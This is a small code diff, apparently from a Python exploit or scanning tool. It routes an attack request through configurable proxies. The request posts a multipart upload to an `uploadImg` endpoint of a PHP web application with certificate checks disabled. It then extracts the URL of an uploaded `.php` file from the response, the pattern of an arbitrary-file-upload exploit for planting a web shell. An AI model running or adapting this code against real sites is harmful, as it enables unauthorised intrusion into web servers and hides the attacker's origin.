@@ -4,6 +4,8 @@
 from cgi import print_form
 import requests
 import re
+
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 
 requests.packages.urllib3.disable_warnings()
@@ -31,7 +33,7 @@ Content-Type: text/plain
 ----------------------------921378126371623762173617--'''
     try:
         r = requests.post(target+"/index.php?s=/home/page/uploadImg",
-                          headers=headers, data=data, verify=False)
+                          headers=headers, data=data, verify=False,proxies=proxies)
         if r.status_code == 200 and r.text:
             resu = re.search(
                 '.*"(http.*?.php)".*', r.text
